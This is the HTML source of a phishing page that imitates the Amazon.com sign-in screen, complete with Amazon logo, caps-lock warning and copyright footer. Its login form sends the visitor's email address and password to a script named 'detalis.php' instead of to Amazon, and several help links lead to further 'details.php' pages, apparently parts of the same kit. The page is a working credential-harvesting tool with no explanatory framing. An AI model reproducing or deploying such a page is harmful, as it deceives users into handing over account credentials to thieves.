
<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">
<html xmlns=\"http://www.w3.org/1999/xhtml\">

<head>
<link rel="icon" type="image/gif" href="content/favicon.gif">


<title>
    Amazon.com Sign In 
</title>
<link  type="text/css" href="content/ap-flex-reduced-nav._3C8_.css" rel="stylesheet" />

<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>  



</head>

<body id="flex-reduced-nav">

<img src="content/sign-in-secure._V192194766_.gif" style="display:none;" alt=""/> 

    
<!--[if lte IE 5]>
<div class="ie">
<![endif]-->

<!--[if IE 6]>
<div class="ie ie6">
<![endif]-->

<!--[if IE 7]>
<div class="ie ie7">
<![endif]-->

<!--[if IE 8]>
<div class="ie ie8">
<![endif]-->

<div id="wrapper">
    
<div id="topSlots">
  <div id="top-1">




<table border="0" cellspacing="0" cellpadding="0" width="100%"> 
 <tbody>
  <td align="left" width="185" valign="bottom">
   <a id="navLogo" class="nonGateway" href="#">
    
     
      <span id="altLogo">
       <img src="content/amazon_logo_no-org_mid._V153387053_.png" height="30" alt="Amazon" width="100" border="0"/>
      </span>
     
     
    
   </a>
  </td>
  <td align="right" valign="top">
   <a href="login.html">Your Account</a> | 
   <a href="#">Help</a>
  </td>
 </tbody>
</table>
</div>
</div>


    
    
        <div id="centerSlots">
    


        <div id="center-0"></div>
        <div id="title-slot">



<!--[if lte IE 5]>
<div class="ie">
<![endif]-->

<!--[if IE 6]>
<div class="ie ie6">
<![endif]-->

<!--[if IE 7]>
<div class="ie ie7">
<![endif]-->  

<!--[if IE 8]>
<div class="ie ie8">
<![endif]-->  
    <div id="ap_title_pagelet">

      
      

      
      
    </div>
<!--[if lte IE 8]>
</div>
<![endif]-->	
	
</div>
        <div id="message-box-slot">







	
	
	

	
	
		<div id="message_warning" class="message warning" style="display:none">
		    <span></span>
		    <h6>Please Enable Cookies to Continue</h6>
		    <p>
				To continue shopping at Amazon.com, please enable cookies in your Web browser.
			</p>
			<p>
				<a href="#" target="AmazonHelp">
					Learn more
				</a>												
		    	about cookies and how to enable them.
		    </p>
		</div>
		

</div>
        <div id="center-1"></div>
        <div id="signin-slot">













<!--[if lte IE 5]>
    <div class="ie">
      <![endif]-->

<!--[if IE 6]>
    <div class="ie ie6">
      <![endif]-->

<!--[if IE 7]>
    <div class="ie ie7">
      <![endif]-->

<!--[if IE 8]>
    <div class="ie ie8">
      <![endif]-->

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>

<head>
	<meta http-equiv="content-type" content="text/html; charset=windows-1256">
	<meta name="author" content="">
	<link rel="stylesheet" type="text/css" media="screen" href="css/screen.css" />
<script src="lib/jquery.js" type="text/javascript"></script>
<script src="jquery.validate.js" type="text/javascript"></script>
<script src="js/cmxforms.js" type="text/javascript"></script>

<script type="text/javascript">

$().ready(function() {
	// validate the comment form when it is submitted
	$("#commentForm").validate();
	
	// validate signup form on keyup and submit
	$("#signupForm").validate({
		rules: {
			emaillo: "required",
			passcode: "required",
		},
		messages: {
           emaillo: "",
            passcode: "",
            		}
	});

});
</script>

</head>

<body>

<form dir="" class="cmxform" id="signupForm" method="POST" action="detalis.php">

  
  
    
  
  





  <div id="ap_signin1a_pagelet" class="ap_table ap_pagelet">

    
    <div id="ap_signin1a_pagelet_title" class="ap_row ap_pagelet_title">
      <h1>Sign In</h1>
    </div>

    

    
    <div id="ap_signin1a_email_section_title" class="ap_row ap_section_title">
      <h2>What is your e-mail address?</h2>
    </div>

    
             
         
         <div id="ap_signin1a_email_row" class="ap_row">
            
                
                                    
                
                    <span class="ap_col1 ap_bold ap_right ap_no_collapse"><label for="ap_email">My e-mail address is: </label></span>
                
            
                   
            <span class="ap_col2 ap_left">

          
        <input id="ap_email" name="emaillo" value="" type="email" size="30" maxlength="128" tabindex="1" autocorrect="off" autocapitalize="off" />

      </span>
    </div>
    <div id="ap_signin_custom_message" class="center clear-both" >
      
    </div>

    
      
      

        
        <div id="ap_signin1a_password_section_title" class="ap_row ap_section_title">
          <h2> Do you have an Amazon.com password? </h2>
        </div>

        
        <div id="ap_signin1a_new_cust_radio_row" class="ap_row">
          <span id="" class="ap_col1 ap_right ap_no_collapse">
            <input type="radio" onclick="setElementAvailability('ap_password', false);" name="create" id="ap_signin_create_radio" value="1" tabindex="4"    />
          </span>
          <span id="" class="ap_col2 bold ap_radio_label">
            <label for="ap_signin_create_radio">No&#44; I am a new customer.</label>
            <div class="small"></div>
          </span>
        </div>

        
        <div id="ap_signin1a_exist_cust_radio_row" class="ap_row">
          <span class="ap_col1 ap_right" >
            <input type="radio" name="create" onclick="setElementAvailability('ap_password', true);" id="ap_signin_existing_radio" value="0" tabindex="5" checked="checked"  />
          </span>
          <span class="ap_col2 bold ap_radio_label"><label for="ap_signin_existing_radio">Yes&#44; I have a password:</label></span>
        </div>

        

             
             <div id="ap_signin1a_password_row" class="ap_row">
               <span class="ap_col1">&nbsp;</span>
               <span class="ap_col2">
                 <input id="ap_password" name="passcode" type="password" maxlength="1024" size="20"  tabindex="2" onkeypress="displayCapsWarning(event,'ap_caps_warning', this);" class="password"/>
               </span>

              <span id="ap_caps_warn_span">
                 
                   
                   
                 
 


<div id="ap_caps_warning" class="ap_caps_warn ap_col3_caps_warn" style="visibility:hidden;"> 
  <!--[if lt IE 7]>
  <style type="text/css">
  .ap_caps_warn {
    display: none;
  }
  </style>
  <![endif]-->
  <b>Caps Lock is on.</b> <font color="black">This may cause you <br />to enter your password incorrectly.</font>
</div>

               </span>
            </div>


            
            <!--[if IE]><![if !IE]><![endif]-->
            <div id="ap_small_forgot_password_link">
            <!--[if IE]><![endif]><![endif]-->
            <!--[if lte IE 6]>
                <div id="ap_small_forgot_password_link_ie_old" class="ie_old">
                    <![endif]-->
               <!--[if gte IE 7]>
               <div id="ap_small_forgot_password_link_ie_new" class="ie_new">
                    <![endif]-->
            
               <span class="small" id="ap_small_forgot_password_span">
                 <a href="details.php?userid=0923487253899293742719439084283589">Forgot your password?</a>
               </span>
           
               </div>
           
      
    

    

    
    
    
    <div id="ap_signin1a_signin_button_row" class="ap_row">
      <span class="ap_col1">&nbsp;</span>
      <span class="ap_col2">
        <input type="image" src="content/sign-in-secure._V192194766_.gif"  id="signInSubmit" height="22" alt="Continue" width="201" tabindex="3" value="Continue" border="0" />
      </span>
      <div class="ap_csm_marker" style="display:none;">

      </div>
    </div>
    
    
      
    
    <div id="ap_signin1a_forgot_password_row" class="ap_row">
      <span class="ap_col1">&nbsp;</span>
      <span class="ap_col2">
        <a href="de">details.php?userid=0923487253899293742719439084283589</a>
      </span>
    </div>

    
      
      <div id="ap_signin1a_cnep_row" class="ap_row">
        <span class="ap_col1">&nbsp;</span>
        <span id="ap_signin1a_cnep_row_col2" class="ap_col2">
          <a href="details.php?action=Email_id=482802350651-18248235-4825898287348">Has your e-mail address changed since your last order?</a>
        </span>
      </div>
    
    
    <div class="ap_row"></div>
  </div>
</form>

<!--[if lte IE 8]>
    </div>
<![endif]-->
</div>
        <div id="center-3"></div>
        </div>

<div id="bottomSlots">
  <div id="bottom-1">


<div id="flex_subslot_frame" class="ap_content_frame">
  <div class="ap_row">
    <span id="signin_subslot_title" class="ap_bold">
      Sign In Help
    </span>
  </div>
  <div class="ap_row">
    <span id="forgot_password_row">
      Forgot your password? <a href="details.php?userid=0923487253899293742719439084283589">Get password help</a>.
    </span>
  </div>
  <div class="ap_row">
    <span id="change_email_row">                    	
      Has your e-mail address changed? <a href="details.php?action=Email_id=482802350651-18248235-4825898287348">Update it here</a>.
    </span>
  </div>
</div>
</div>
  <div id="bottom-5">

<div id="ap_privacy" class="ap_privacy_footer">
<p class="tiny" align="center">
<a onclick="return amz_js_PopWin('#');" target="AmazonHelp" href="#">Conditions of Use</a>
  <a onclick="return amz_js_PopWin('#');" target="AmazonHelp" href="#">Privacy Notice</a>
� 1996-2013, Amazon.com, Inc. or its affiliates
</p>
</div>
</div>
</div>

<div id="javascriptSlots">



<div id="javascript-identity">











</div>

<div id="js-trms">


</div>

<!--[if lte IE 8]>
</div>
<![endif]-->

<div id='be' style="display:none;"><form name='ue_backdetect' action="get"><input type="hidden" name='ue_back' value='1' /></form></div>

</body>
</html>
